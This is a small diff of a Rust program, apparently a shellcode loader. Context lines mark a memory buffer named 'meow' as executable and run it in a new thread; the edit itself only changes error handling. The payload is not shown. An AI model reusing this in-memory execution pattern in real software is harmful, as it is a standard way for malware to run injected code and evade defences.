@@ -59,7 +59,7 @@ fn main(){
         VirtualProtect(mem_addr, meow.len(), PAGE_EXECUTE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));
 
         // Create a local thread
-        let h_thread = CreateThread(Some(ptr::null()), 0, Some(std::mem::transmute(mem_addr)), Some(ptr::null()), THREAD_CREATION_FLAGS(0), Some(ptr::null_mut())).unwrap();
+        let h_thread = CreateThread(Some(ptr::null()), 0, Some(std::mem::transmute(mem_addr)), Some(ptr::null()), THREAD_CREATION_FLAGS(0), Some(ptr::null_mut())).expect("Failed to create thread");
         WaitForSingleObject(h_thread, INFINITE);
         CloseHandle(h_thread);
     };
